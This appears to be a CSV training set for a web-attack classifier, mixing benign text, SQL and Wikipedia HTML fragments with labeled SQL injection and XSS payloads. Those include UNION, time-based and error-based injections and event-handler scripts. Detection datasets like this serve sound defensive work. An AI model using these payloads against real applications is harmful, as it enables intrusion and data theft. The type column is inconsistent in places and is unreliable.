Text,Label,type
"<xmp onmouseover=""alert(1)"">test</xmp>",2,xss
SELECT plus FROM plural UNION SELECT education FROM opposite ORDER BY shinning,0,sql
"-6803""  )   order by 1#",1,sql
lenya@fbi-criminal-network.com.mil,0,sql
"1""  )   where 1833  =  1833",1,sql
"<tfoot draggable=""true"" ondrag=""alert(1)"">test</tfoot>",2,xss
"1  )   as iupg where 2861  =  2861 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
1  )   as odqn where 3910  =  3910,1,sql
SELECT * FROM nearest  WHERE still = save,0,sql
1'   )    )    and 3526  =  1354,1,sql
<font id=x tabindex=1 onbeforeactivate=alert(1)></font>,2,xss
1'   )    )    as pdcl where 6964  =  6964,1,xss
"SELECT SupplierName, ContactName, Address, City, PostalCode, Country FROM Suppliers; INSERT INTO Customers  ( CustomerName, City, Country )  ",0,xss
"<li><img alt=""Outline"" src=""//upload.wikimedia.org/wikipedia/commons/thumb/4/41/Global_thinking.svg/10px-Global_thinking.svg.png"" decoding=""async"" title=""Outline"" width=""10"" height=""16"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/4/41/Global_thinking.svg/15px-Global_thinking.svg.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/4/41/Global_thinking.svg/21px-Global_thinking.svg.png 2x"" data-file-width=""130"" data-file-height=""200"" /> <b><a href=""/wiki/Outline_of_computer_science"" title=""Outline of computer science"">Outline </a> </b> </li>",0,xss
"1""  )   where 9680  =  9680 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,sql
ardurn,0,sql
den21o9a,0,sql
SELECT COUNT ( sport ) FROM wore,0,sql
select   (  case when   (  4306  =  2815  )   then 4306 else 1/  (  select 0  )   end  )  --,1,sql
"-1908""  )   where 6420  =  6420 union all select 6420,6420,6420,6420--",1,sql
SELECT owner FROM flies UNION SELECT circus FROM onto ORDER BY collect,0,sql
"  SELECT brass,luck,town FROM left LEFT JOIN Orders ON feature.queenID =  daughter.mouse ORDER BY present.monkey",0,sql
monforte del cid,0,xss
	 </span>,0,xss
"1""   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""ddun""  =  ""ddun",1,sql
verdusco,0,sql
1'   )    )    as eymg where 7000  =  7000,1,sql
SELECT * FROM its WHERE happen NOT LIKE '[truck]%',0,sql
"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",1,sql
"<content onkeydown=""alert(1)"" contenteditable>test</content>",2,xss
 union all select @@version--,1,xss
"  UPDATE hat SET fuel =  'meat', City =  'differ' WHERE signal =  root",0,sql
"<h2><span class=""mw-headline"" id=""External_links"">External links ",0,xss
SELECT hidden ( s FROM kill RIGHT JOIN,0,sql
"<wbr draggable=""true"" ondragleave=""alert(1)"">test</wbr>",2,xss
yee,0,sql
<strike onfocusout=alert(1) tabindex=1 id=x></strike><input autofocus>,2,xss
99745017c,0,sql
-4137   )    )    as elxu where 5672  =  5672 order by 1--,1,sql
"<noscript onbeforecopy=""alert(1)"" contenteditable>test</noscript>",2,xss
"1""   )    )    as upvg where 4826  =  4826",1,sql
</div>,0,xss
"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;2–3 and 948 </li> </ul>",0,xss
<BODY ONLOAD=alert('')>,2,xss
SELECT COUNT ( beauty ) FROM per,0,xss
"a=""get"";",2,xss
1 where 9393  =  9393 waitfor delay '0:0:5'--,1,sql
select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1',1,xss
<figure onpointerdown=alert(1)>XSS</figure>,2,xss
busqu,0,sql
"<li><a href=""/wiki/Alexey_Lyapunov"" title=""Alexey Lyapunov"">Alexey Lyapunov </a> </li>",0,xss
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, p.&#160;758 </li>",0,xss
<sup onfocusout=alert(1) tabindex=1 id=x></sup><input autofocus>,2,xss
"1%""  )   and 2006  =  2006",1,sql
SELECT * FROM had 3 SELECT * FROM growth,0,sql
SELECT * FROM traffic 3,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c82fbdbb25' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0,sql
SELECT TOP 50 PERCENT * FROM cook,0,sql
"1'  )   where 7561  =  7561 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
shanir,0,xss
1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,sql
	 </span>,0,xss
"<shadow oncontextmenu=""alert(1)"">test</shadow>",2,xss
"1   )    )    as fwru where 5262  =  5262 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,xss
oskar,0,sql
escenogrfica,0,sql
"select pg_sleep  (  5  )   and   (  ""%""  =  """,1,xss
-2165' where 6593  =  6593 or 9158  =  7254--,1,sql
"<a href=""/wiki/Artificial_life"" title=""Artificial life"">Artificial life </a> and society based learning:",0,xss
"	 </span> <span class=""reference-text""><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;480–483. ",0,xss
"<ul><li><a href=""/wiki/Averroes"" title=""Averroes"">Averroes </a> </li>",0,xss
ulano,0,xss
"avinguda gabriel alomar i villalonga, 20 6?a",0,xss
"1   )    )    as wmxa where 6485  =  6485 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
"<li><a href=""/wiki/Ferroelectric_RAM"" title=""Ferroelectric RAM"">FRAM </a> </li>",0,xss
3.31765E+15,0,xss
1  )   as tbve where 4828  =  4828,1,sql
"<video onbeforecopy=""alert(1)"" contenteditable>test</video>",2,xss
"1%'   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
"	 </span>. <i>AI Matters </i>. <b>1 </b> (1): 9–11. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1145%2F2639475.2639478"">10.1145/2639475.2639478 </a>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20160115114604/http://www.sophia.de/pdf/2014_PT-AI_polls.pdf"">Archived </a> <span class=""cs1-format"">(PDF) ",0,xss
 or 1  =  1 --,1,sql
<shadow onpointerout=alert(1)>XSS</shadow>,2,xss
FROM  ( SELECT DISTINCT wide FROM fifteen ) ,0,sql
"-3852'  )   union all select 3577,3577,3577,3577,3577,3577,3577,3577#",1,sql
"-8166""   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""lcqb""  =  ""lcqb",1,xss
%2A%7C,1,sql
SELECT AVG ( scientific ) FROM southern,0,xss
SELECT TOP 3 * FROM higher,0,sql
"<ruby draggable=""true"" ondragstart=""alert(1)"">test</ruby>",2,xss
"<thead onmouseout=""alert(1)"">test</thead>",2,xss
1  )   where 2010  =  2010,1,sql
"<body onkeyup=""alert(1)"" contenteditable>test</body>",2,xss
<img onpointerleave=alert(1)>XSS</img>,2,xss
SELECT * FROM idea WHERE NOT hole = 'who'  AND NOT movement = 'author',0,sql
"<marquee onkeyup=""alert(1)"" contenteditable>test</marquee>",2,xss
17488,0,sql
or 0  =  0 --,1,sql
"1""   )    )     )   union all select null,null,null,null,null,null#",1,sql
25140,0,sql
milton,0,xss
7.20299E+15,0,sql
or 1  =  1,1,sql
duilio,0,sql
SELECT compound ( s )  FROM press UNION,0,sql
 UPDATE becoming SET space = 'present'WHERE orange = 'depend',0,xss
"1'  )   as qaec where 6572  =  6572 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
"-3885  )   where 2387  =  2387 union all select 2387,2387,2387,2387,2387,2387,2387#",1,xss
" select * from users where id  =  1 +$ 1 union select null,@@VERSION -- 1",1,xss
1  )   where 4711  =  4711,1,sql
	 </span></a>.</dd>,0,xss
SELECT TOP 50 PERCENT * FROM conversation,0,sql
"umbria, 143,",0,sql
"<div role=""navigation"" aria-label=""breadcrumbs navigation"">",0,xss
"<kbd onkeypress=""alert(1)"" contenteditable>test</kbd>",2,xss
fuentes calientes,0,sql
" SELECT Employees.LastName, COUNT ( Orders.OrderID )  AS NumberOfOrders FROM  ( Orders INNER JOIN Employees ON Orders.EmployeeID  =  Employees.EmployeeID )  GROUP BY LastName HAVING COUNT ( Orders.OrderID )  > 10;",0,xss
"waitfor delay '0:0:5' and    (    (     (  ""%""  =  """,1,xss
"  SELECT shallowID AS ID, service AS carry FROM topic",0,xss
"-4586'  )   as shdb where 6176  =  6176 union all select 6176,6176,6176,6176#",1,xss
SELECT * FROM previous WHERE    NOT bad = 'powder',0,sql
SELECT * FROM grabbed WHERE mass = 'pictured' FETCH FIRST 3 ROWS ONLY,0,sql
<ruby id=x tabindex=1 ondeactivate=alert(1)></ruby><input id=y autofocus>,2,xss
"	 </span> <span class=""toctext"">Superintelligence ",0,xss
"-6720'   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'enfe' like 'enfe",1,sql
8011,0,sql
SELECT FROM_DAYS ( 780500 ) ;,0,sql
alg59za,0,xss
	 </span> </a> </li>,0,xss
SELECT * FROM sky WHERE light BETWEEN '1996-07-01' AND '1996-07-31',0,sql
SELECT TOP 3 * FROM city,0,sql
1' in boolean mode  )   and 5725  =  5552#,1,sql
"<shadow oncut=""alert(1)"" contenteditable>test</shadow>",2,xss
"-4319""  )   where 7534  =  7534 or 8246  =  3217",1,sql
"  SELECT BINARY ""HELLO""  =  ""hello"";",0,xss
SELECT * FROM experiment WHERE height = 'other'  AND City = 'red',0,sql
SELECT Count ( * )  AS DistinctCountries,0,sql
1 rlike   (  select   (  case when   (  8911  =  5301  )   then 1 else 0x28 end   )    )   # pmuh,1,xss
"1""  )   where 4739  =  4739 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,sql
	 </span>,0,xss
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'nimx'  =  'nimx",1,sql
"select * from generate_series  (  3827,3827,case when   (  3827  =  7095  )   then 1 else 0 end  )   limit 1--",1,sql
vallart casabella,0,sql
gift@distritoeste.no,0,xss
"jirafa, 165 7?g",0,xss
"1%""   )    )     )   and 7533  =  7533 and    (    (     (  ""%""  =  """,1,sql
<wbr id=x tabindex=1 ondeactivate=alert(1)></wbr><input id=y autofocus>,2,xss
select pg_sleep  (  5  )   and   (  'aydg'  =  'aydg,1,sql
SELECT * FROM Customers  WHERE City LIKE '[bsp]%';,0,sql
"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;275–277 </li> </ul>",0,xss
 </li>,0,xss
1  )   where 8094  =  8094,1,sql
SELECT * FROM order,0,sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1,sql
descabellar,0,xss
SELECT variety ( s ) FROM choice INNER JOIN,0,sql
	 </span>,0,xss
	 </span>,0,xss
SELECT AVG ( dot ) FROM building SELECT SUM ( noted ) ,0,sql
1' where 2389  =  2389 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,sql
<span onpointerup=alert(1)>XSS</span>,2,xss
"b=""URL(\"""";",2,xss
SELECT * FROM sign WHERE dance  BETWEEN 10 AND 20,0,sql
"1  )   union all select null,null,null,null,null,null#",1,sql
"   SELECT complete,sit,push,including,compare     (  (  energy JOIN use ON row.not =  door.southern )   INNER JOIN policemanON Orders.halfway =  explain.pitchID ) ",0,sql
SELECT * FROM equator FETCH FIRST 50 PERCENT ROWS ONLY,0,xss
"1'   )    )    as qwdh where 7581  =  7581 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
SELECT TOP 3 * FROM keep SELECT * FROM nearby 3SELECT * FROM improve,0,sql
san perfecto 8,0,sql
<caption id=x tabindex=1 ondeactivate=alert(1)></caption><input id=y autofocus>,2,xss
<i onblur=alert(1) tabindex=1 id=x></i><input autofocus>,2,xss
" </p><p>Proposed ""universal intelligence"" tests aim to compare how well machines, humans, and even non-human animals perform on problem sets that are generic as possible. At an extreme, the test suite can contain every possible problem, weighted by <a href=""/wiki/Kolmogorov_complexity"" title=""Kolmogorov complexity"">Kolmogorov complexity </a>; unfortunately, these problem sets tend to be dominated by impoverished pattern-matching exercises where a tuned AI can easily exceed human performance levels.<sup id=""cite_ref-Mathematical_definitions_of_intelligence_287-0"" class=""reference""><a href=""#cite_note-Mathematical_definitions_of_intelligence-287"">&#91;276&#93; </a> </sup><sup id=""cite_ref-288"" class=""reference""><a href=""#cite_note-288"">&#91;277&#93; </a> </sup>",0,xss
SELECT jump FROM mark UNION SELECT corner FROM coal ORDER BY over,0,sql
" </p><p>A common <a href=""/wiki/Trope_(literature)"" title=""Trope (literature)"">trope </a> in these works began with <a href=""/wiki/Mary_Shelley"" title=""Mary Shelley"">Mary Shelley </a>'s <i><a href=""/wiki/Frankenstein"" title=""Frankenstein"">Frankenstein </a> </i>, where a human creation becomes a threat to its masters. This includes such works as <a href=""/wiki/2001:_A_Space_Odyssey_(novel)"" title=""2001: A Space Odyssey (novel)"">Arthur C. Clarke's </a> and <a href=""/wiki/2001:_A_Space_Odyssey_(film)"" title=""2001: A Space Odyssey (film)"">Stanley Kubrick's </a> <i><a href=""/wiki/2001:_A_Space_Odyssey"" title=""2001: A Space Odyssey"">2001: A Space Odyssey </a> </i> (both 1968), with <a href=""/wiki/HAL_9000"" title=""HAL 9000"">HAL 9000 </a>, the murderous computer in charge of the <i><a href=""/wiki/Discovery_One"" title=""Discovery One"">Discovery One </a> </i> spaceship, as well as <i><a href=""/wiki/The_Terminator"" title=""The Terminator"">The Terminator </a> </i> (1984) and <i><a href=""/wiki/The_Matrix"" title=""The Matrix"">The Matrix </a> </i> (1999). In contrast, the rare loyal robots such as Gort from <i><a href=""/wiki/The_Day_the_Earth_Stood_Still"" title=""The Day the Earth Stood Still"">The Day the Earth Stood Still </a> </i> (1951) and Bishop from <i><a href=""/wiki/Aliens_(film)"" title=""Aliens (film)"">Aliens </a> </i> (1986) are less prominent in popular culture.<sup id=""cite_ref-414"" class=""reference""><a href=""#cite_note-414"">&#91;402&#93; </a> </sup>",0,xss
25613,0,sql
"Dreyfus criticized the <a href=""/wiki/Necessary_and_sufficient"" class=""mw-redirect"" title=""Necessary and sufficient"">necessary </a> condition of the <a href=""/wiki/Physical_symbol_system"" title=""Physical symbol system"">physical symbol system </a> hypothesis, which he called the ""psychological assumption"": ""The mind can be viewed as a device operating on bits of information according to formal rules."" (<a href=""#CITEREFDreyfus1992"">Dreyfus 1992 </a>, p.&#160;156) ",0,xss
"  SELECT rule,cave FROM agree WHERE naturally = 'package' UNION SELECT specific, remain FROM paragraph",0,sql
1%'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  '%'  =  ',1,sql
torre de arcas,0,sql
"<tr onkeydown=""alert(1)"" contenteditable>test</tr>",2,xss
rahmani,0,sql
<listing onblur=alert(1) tabindex=1 id=x></listing><input autofocus>,2,xss
SELECT * FROM opinion ORDER BY forgot,0,sql
"<li><cite id=""CITEREFKumarKumar2012"" class=""citation journal"">Kumar, Gulshan; Kumar, Krishan (2012). ""The Use of Artificial-Intelligence-Based Ensembles for Intrusion Detection: A Review"". <i>Applied Computational Intelligence and Soft Computing </i>. <b>2012 </b>: 1–20. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1155%2F2012%2F850160"">10.1155/2012/850160 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Applied+Computational+Intelligence+and+Soft+Computing&amp;rft.atitle=The+Use+of+Artificial-Intelligence-Based+Ensembles+for+Intrusion+Detection%3A+A+Review&amp;rft.volume=2012&amp;rft.pages=1-20&amp;rft.date=2012&amp;rft_id=info%3Adoi%2F10.1155%2F2012%2F850160&amp;rft.aulast=Kumar&amp;rft.aufirst=Gulshan&amp;rft.au=Kumar%2C+Krishan&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<li id=""cite_note-395""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-395"">^ </a> </b> ",0,xss
jed,0,sql
"SELECT DAYNAME ( ""2017-06-15 09:34:21"" ) ;",0,sql
"<image oncopy=""alert(1)"" contenteditable>test</image>",2,xss
60210107v,0,sql
bruasewetter.astin6@locuraporno.int,0,xss
SELECT COUNT ( DISTINCT composed )  FROM becoming,0,sql
"1""   )    )     )   and 2006  =  2006",1,sql
"-8893%'  )   union all select 1254,1254--",1,sql
"	 </span> <span class=""reference-text"">Griewank, Andreas (2012). Who Invented the Reverse Mode of Differentiation?. Optimization Stories, Documenta Matematica, Extra Volume ISMP (2012), 389–400. ",0,xss
yeladaky janeiro,0,sql
SELECT AVG ( apartment ) FROM thy,0,sql
"1""   )    )    as vhrq where 1690  =  1690 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1,sql
em+buchada,0,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 7515 )  ORDER BY meta_id ASC",0,xss
<u onpointerleave=alert(1)>XSS</u>,2,xss
waitfor delay '0:0:5' and    (    (   'yjsp' like 'yjsp,1,sql
SELECT secret ( s FROM must RIGHT JOIN,0,xss
"<li id=""cite_note-318""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-318"">^ </a> </b> ",0,xss
"-1583'  )   or elt  (  1032  =  1032,3623  )   and   (  'jrcj' like 'jrcj",1,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
SELECT * FROM origin ORDER BY winter DESC,0,sql
"<button oncontextmenu=""alert(1)"">test</button>",2,xss
	 </span>,0,xss
<map onpointerenter=alert(1)>XSS</map>,2,xss
1 or sleep  (  __TIME__  )  #,1,sql
"<source onclick=""alert(1)"">test</source>",2,xss
-2756' where 6156  =  6156 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,sql
